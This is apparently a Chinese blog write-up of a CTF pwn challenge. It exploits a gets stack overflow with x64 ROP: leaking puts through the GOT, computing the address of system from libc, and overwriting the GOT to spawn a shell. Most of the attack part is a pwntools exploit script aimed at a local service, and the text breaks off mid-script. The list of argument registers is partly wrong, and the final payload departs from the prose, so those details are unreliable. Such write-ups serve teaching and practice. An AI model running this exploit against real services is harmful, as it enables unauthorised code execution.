---
layout:     post
title:      "2018铁三个人赛样题writeup"
subtitle:   " \"x64 Rop\""
date:       2018-02-12 12:00:00
author:     "Chris"
catalog: true
tags:
    - Pwn
 
---

>文件链接

[https://github.com/yxshyj/project/tree/master/pwn/2018%E9%93%81%E4%B8%89%E4%B8%AA%E4%BA%BA%E8%B5%9B%E6%A0%B7%E9%A2%98](https://github.com/yxshyj/project/tree/master/pwn/2018%E9%93%81%E4%B8%89%E4%B8%AA%E4%BA%BA%E8%B5%9B%E6%A0%B7%E9%A2%98)

<html><head><meta name="generator" content="Aspose.Words for .NET 15.1.0.0" /><span style="font-family:Calibri; font-size:16pt; font-weight:bold">1</span><span style="font-family:宋体; font-size:16pt; font-weight:bold">、</span><span style="font-family:宋体; font-size:16pt; font-weight:bold">程序分析</span></h3><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:宋体; font-size:10.5pt">使用</span><span style="font-family:Calibri; font-size:10.5pt">IDA pro </span><span style="font-family:宋体; font-size:10.5pt">打开程序文件</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0">![](https://i.imgur.com/16hax4G.png)</p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:宋体; font-size:10.5pt">程序存在典型的栈溢出，使用</span><span style="font-family:Calibri; font-size:10.5pt">gets</span><span style="font-family:宋体; font-size:10.5pt">没有限制输入的长度，而且存在</span><span style="font-family:Calibri; font-size:10.5pt">gets</span><span style="font-family:宋体; font-size:10.5pt">，</span><span style="font-family:Calibri; font-size:10.5pt">puts</span><span style="font-family:宋体; font-size:10.5pt">等函数调用。</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt">&#xa0;</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:宋体; font-size:10.5pt">运行程序</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0">![](https://i.imgur.com/Wn8NFmk.png)</p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:宋体; font-size:10.5pt">长度过长的时候会导致程序崩溃。</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt">&#xa0;</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:宋体; font-size:10.5pt">检查程序的保护措施</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0">![](https://i.imgur.com/r00sAnm.png)</p><h3 style="font-size:16pt; line-height:172%; margin:13pt 0pt; orphans:0; page-break-after:avoid; page-break-inside:avoid; text-align:justify; text-indent:0pt; widows:0"><span style="font-family:Calibri; font-size:16pt; font-weight:bold">2</span><span style="font-family:宋体; font-size:16pt; font-weight:bold">、</span><span style="font-family:宋体; font-size:16pt; font-weight:bold">测量偏移长度</span></h3><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; text-indent:0pt; widows:0"><span style="font-family:Calibri; font-size:10.5pt">1)</span><span style="font:7.0pt 'Times New Roman'">&#xa0; </span><span style="font-family:宋体; font-size:10.5pt">使用</span><span style="font-family:Calibri; font-size:10.5pt">pwntools </span><span style="font-family:宋体; font-size:10.5pt">产生</span><span style="font-family:Calibri; font-size:10.5pt">150</span><span style="font-family:宋体; font-size:10.5pt">个垃圾字符</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt">pip install pwntools </span><span style="font-family:宋体; font-size:10.5pt">之后 </span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt">pwn cyclic 150</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0">![](https://i.imgur.com/eynMELO.png)</p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:宋体; font-size:10.5pt">将这些字符串输出到一个</span><span style="font-family:Calibri; font-size:10.5pt">test</span><span style="font-family:宋体; font-size:10.5pt">文件中</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; text-indent:0pt; widows:0"><span style="font-family:Calibri; font-size:10.5pt">2)</span><span style="font:7.0pt 'Times New Roman'">&#xa0; </span><span style="font-family:Calibri; font-size:10.5pt">gdb </span><span style="font-family:宋体; font-size:10.5pt">调试</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0">![](https://i.imgur.com/krUzqBd.png)</p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt">&#xa0;</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:宋体; font-size:10.5pt">查看</span><span style="font-family:Calibri; font-size:10.5pt">gdb</span><span style="font-family:宋体; font-size:10.5pt">的调试信息</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0">![](https://i.imgur.com/u0dZ1WC.png)</p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:宋体; font-size:10.5pt">图中显示运行到</span><span style="font-family:Calibri; font-size:10.5pt">ret </span><span style="font-family:宋体; font-size:10.5pt">处停止，</span><span style="font-family:Calibri; font-size:10.5pt">ret </span><span style="font-family:宋体; font-size:10.5pt">指令 相当于 </span><span style="font-family:Calibri; font-size:10.5pt">pop rax ; jmp rax </span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:宋体; font-size:10.5pt">也就是从栈顶取值，并跳转到这个值的地址。</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:宋体; font-size:10.5pt">栈顶的值是</span><span style="font-family:Calibri; font-size:10.5pt">kaaa </span><span style="font-family:宋体; font-size:10.5pt">由此得偏移量为</span><span style="font-family:Calibri; font-size:10.5pt">40</span><span style="font-family:宋体; font-size:10.5pt">。</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0">![](https://i.imgur.com/klPeu5U.png)</p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt">&#xa0;</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt">&#xa0;</span></p><h3 style="font-size:16pt; line-height:172%; margin:13pt 0pt; orphans:0; page-break-after:avoid; page-break-inside:avoid; text-align:justify; text-indent:0pt; widows:0"><span style="font-family:Calibri; font-size:16pt; font-weight:bold">3</span><span style="font-family:宋体; font-size:16pt; font-weight:bold">、</span><span style="font-family:宋体; font-size:16pt; font-weight:bold">漏洞利用思路</span></h3><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:宋体; font-size:10.5pt">现在可以利用栈溢出让程序跳转到任意位置，但是由于程序开启了</span><span style="font-family:Calibri; font-size:10.5pt">NX</span><span style="font-family:宋体; font-size:10.5pt">，且系统中开启了</span><span style="font-family:Calibri; font-size:10.5pt">ASLR</span><span style="font-family:宋体; font-size:10.5pt">，所以采用</span><span style="font-family:Calibri; font-size:10.5pt">ROP</span><span style="font-family:宋体; font-size:10.5pt">技术，构造出一个</span><span style="font-family:Calibri; font-size:10.5pt">system(</span><span style="font-family:Calibri; font-size:10.5pt">“</span><span style="font-family:Calibri; font-size:10.5pt">/bin/sh</span><span style="font-family:Calibri; font-size:10.5pt">”</span><span style="font-family:Calibri; font-size:10.5pt">).</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt">system</span><span style="font-family:宋体; font-size:10.5pt">函数在</span><span style="font-family:Calibri; font-size:10.5pt">libc</span><span style="font-family:宋体; font-size:10.5pt">中，且每次运行都会变化，我们通过构造</span><span style="font-family:Calibri; font-size:10.5pt">payload</span><span style="font-family:宋体; font-size:10.5pt">泄露</span><span style="font-family:Calibri; font-size:10.5pt">libc</span><span style="font-family:宋体; font-size:10.5pt">中的另一个函数</span><span style="font-family:Calibri; font-size:10.5pt">puts</span><span style="font-family:宋体; font-size:10.5pt">在</span><span style="font-family:Calibri; font-size:10.5pt">GOT</span><span style="font-family:宋体; font-size:10.5pt">表中的真实地址，</span><span style="font-family:Calibri; font-size:10.5pt">puts</span><span style="font-family:宋体; font-size:10.5pt">和</span><span style="font-family:Calibri; font-size:10.5pt">system </span><span style="font-family:宋体; font-size:10.5pt">在</span><span style="font-family:Calibri; font-size:10.5pt">libc</span><span style="font-family:宋体; font-size:10.5pt">中的偏移是固定的，进而推算出</span><span style="font-family:Calibri; font-size:10.5pt">system</span><span style="font-family:宋体; font-size:10.5pt">地址。</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:宋体; font-size:10.5pt">再次构造</span><span style="font-family:Calibri; font-size:10.5pt">ROP </span><span style="font-family:宋体; font-size:10.5pt">使用</span><span style="font-family:Calibri; font-size:10.5pt">gets</span><span style="font-family:宋体; font-size:10.5pt">函数将</span><span style="font-family:Calibri; font-size:10.5pt">put</span><span style="font-family:宋体; font-size:10.5pt">函数的</span><span style="font-family:Calibri; font-size:10.5pt">GOT</span><span style="font-family:宋体; font-size:10.5pt">地址覆盖为</span><span style="font-family:Calibri; font-size:10.5pt">system</span><span style="font-family:宋体; font-size:10.5pt">函数地址，然后再跳转到</span><span style="font-family:Calibri; font-size:10.5pt">put</span><span style="font-family:宋体; font-size:10.5pt">即可实现</span><span style="font-family:Calibri; font-size:10.5pt">getshell</span><span style="font-family:宋体; font-size:10.5pt">。</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt">&#xa0;</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; text-indent:0pt; widows:0"><span style="font-family:Calibri; font-size:10.5pt">1)</span><span style="font:7.0pt 'Times New Roman'">&#xa0; </span><span style="font-family:宋体; font-size:10.5pt">泄露</span><span style="font-family:Calibri; font-size:10.5pt">puts</span><span style="font-family:宋体; font-size:10.5pt">函数的</span><span style="font-family:Calibri; font-size:10.5pt">GOT</span><span style="font-family:宋体; font-size:10.5pt">地址</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:宋体; font-size:10.5pt">首先收集</span><span style="font-family:Calibri; font-size:10.5pt">gets</span><span style="font-family:宋体; font-size:10.5pt">的</span><span style="font-family:Calibri; font-size:10.5pt">plt</span><span style="font-family:宋体; font-size:10.5pt">地址 和 </span><span style="font-family:Calibri; font-size:10.5pt">puts</span><span style="font-family:宋体; font-size:10.5pt">的</span><span style="font-family:Calibri; font-size:10.5pt">plt</span><span style="font-family:宋体; font-size:10.5pt">，</span><span style="font-family:Calibri; font-size:10.5pt">got</span><span style="font-family:宋体; font-size:10.5pt">地址。</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0">![](https://i.imgur.com/AAdxxpE.png)</p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt">&#xa0;</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:宋体; font-size:10.5pt">需要构造 </span><span style="font-family:Calibri; font-size:10.5pt">puts(puts\_got) </span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:宋体; font-size:10.5pt">在</span><span style="font-family:Calibri; font-size:10.5pt">64</span><span style="font-family:宋体; font-size:10.5pt">位中通过寄存器传递参数 依次是</span><span style="font-family:Calibri; font-size:10.5pt">rdi,rsi,rdx,r10,r8,r9</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:宋体; font-size:10.5pt">使用</span><span style="font-family:Calibri; font-size:10.5pt">ROPgadget </span><span style="font-family:宋体; font-size:10.5pt">查找 </span><span style="font-family:Calibri; font-size:10.5pt">pop rdi;ret;  </span><span style="font-family:宋体; font-size:10.5pt">用于设置</span><span style="font-family:Calibri; font-size:10.5pt">puts</span><span style="font-family:宋体; font-size:10.5pt">函数的第一个参数。</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt">ROPgadget --binary ./tie3\_pwn --only "pop|ret"</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0">![](https://i.imgur.com/Wc5KnZl.png)</p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt">pop rdi ; ret ; </span><span style="font-family:宋体; font-size:10.5pt">的地址是</span><span style="font-family:Calibri; font-size:10.5pt">0x4006f3</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt">&#xa0;</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:宋体; font-size:10.5pt">构造</span><span style="font-family:Calibri; font-size:10.5pt">payload  pop\_rdi + puts\_got + puts\_plt  </span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0">![](https://i.imgur.com/P4l6ru1.png)</p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:宋体; font-size:10.5pt">运行结果如下</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0">![](https://i.imgur.com/aVYERT3.png)</p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt">&#xa0;</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt">&#xa0;</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:宋体; font-size:10.5pt">到此已经成功的获取到了</span><span style="font-family:Calibri; font-size:10.5pt">put</span><span style="font-family:宋体; font-size:10.5pt">的函数地址。</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt">&#xa0;</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:宋体; font-size:10.5pt">计算偏移</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt">libc = ELF("/lib/x86\_64-linux-gnu/libc.so.6")</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt"></span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt">system\_off = libc.symbols['system']</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt">puts\_off = libc.symbols['puts']</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt">off = system\_off - puts\_off</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:宋体; font-size:10.5pt">此时</span><span style="font-family:Calibri; font-size:10.5pt">system</span><span style="font-family:宋体; font-size:10.5pt">的地址也知道了。</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt">&#xa0;</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; text-indent:0pt; widows:0"><span style="font-family:Calibri; font-size:10.5pt">2)</span><span style="font:7.0pt 'Times New Roman'">&#xa0; </span><span style="font-family:宋体; font-size:10.5pt">将</span><span style="font-family:Calibri; font-size:10.5pt">put</span><span style="font-family:宋体; font-size:10.5pt">替换为</span><span style="font-family:Calibri; font-size:10.5pt">system</span><span style="font-family:宋体; font-size:10.5pt">地址获得</span><span style="font-family:Calibri; font-size:10.5pt">shell</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:宋体; font-size:10.5pt">使用</span><span style="font-family:Calibri; font-size:10.5pt">gets</span><span style="font-family:宋体; font-size:10.5pt">函数，构造</span><span style="font-family:Calibri; font-size:10.5pt">gets(puts\_got)  </span><span style="font-family:宋体; font-size:10.5pt">，然后再构造</span><span style="font-family:Calibri; font-size:10.5pt">system(</span><span style="font-family:Calibri; font-size:10.5pt">“</span><span style="font-family:Calibri; font-size:10.5pt">/bin/sh</span><span style="font-family:Calibri; font-size:10.5pt">”</span><span style="font-family:Calibri; font-size:10.5pt">)</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt">&#xa0;</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:宋体; font-size:10.5pt">在原来的基础上</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt">pop\_rdi + puts\_got + puts\_plt  </span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt">+ pop\_rdi+puts\_got+gets\_plt  </span><span style="font-family:宋体; font-size:10.5pt">此时已经构造好覆盖</span><span style="font-family:Calibri; font-size:10.5pt">put</span><span style="font-family:宋体; font-size:10.5pt">函数</span><span style="font-family:Calibri; font-size:10.5pt">got</span><span style="font-family:宋体; font-size:10.5pt">表的</span><span style="font-family:Calibri; font-size:10.5pt">payload</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt">+pop\_rdi + bin_sh + puts\_plt   </span><span style="font-family:宋体; font-size:10.5pt">执行</span><span style="font-family:Calibri; font-size:10.5pt">system(</span><span style="font-family:Calibri; font-size:10.5pt">“</span><span style="font-family:Calibri; font-size:10.5pt">/bin/sh</span><span style="font-family:Calibri; font-size:10.5pt">”</span><span style="font-family:Calibri; font-size:10.5pt">)</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt">&#xa0;</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="font-family:Calibri; font-size:10.5pt">&#xa0;</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; text-transform:none">&#xa0;</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:宋体; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">最后完整的</span><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">payload</span><span style="background-color:#ffffff; color:#333333; font-family:宋体; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">如下</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; text-transform:none">&#xa0;</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">from pwn import \*</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">context.log\_level = "debug"</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; text-transform:none">&#xa0;</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">e = ELF("./tie3_pwn")</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">puts\_plt = e.plt['puts']</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">gets\_plt = e.plt['gets']</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">puts\_got = e.got['puts']</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; text-transform:none">&#xa0;</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">print "puts\_plt: "+hex(puts\_plt)</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">print "gets\_plt: "+hex(gets\_plt)</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">print "puts\_got: "+hex(puts\_got)</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; text-transform:none">&#xa0;</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">pop\_rdi = 0x4006f3</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">print "pop\_rdi: "+hex(pop\_rdi)</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; text-transform:none">&#xa0;</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">libc = ELF("/lib/x86\_64-linux-gnu/libc.so.6")</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none"></span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">system\_off = libc.symbols['system']</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">puts\_off = libc.symbols['puts']</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">off = system\_off - puts\_off</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; text-transform:none">&#xa0;</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">payload = "A"*40+p64(pop\_rdi)+p64(puts\_got)+p64(puts\_plt)</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">payload += p64(pop\_rdi)+p64(puts\_got)+p64(gets\_plt)</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">payload += p64(pop\_rdi)+p64(puts\_got+8)+p64(puts\_plt)</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; text-transform:none">&#xa0;</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">s = remote("127.0.0.1",8888)</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">s.recvuntil(":")</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">s.sendline(payload)</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">s.recvuntil("tie3\n")</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; text-transform:none">&#xa0;</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; color:#333333; font-family:Arial; font-size:10.5pt; font-style:normal; font-weight:normal; text-transform:none">puts\_addr = u64(s.recvuntil("\n")[:-1].ljust(8,"\x00"))</span></p><p style="font-size:10.5pt; line-height:115%; margin:0pt 0pt 10pt; orphans:0; text-align:justify; widows:0"><span style="background-color:#ffffff; 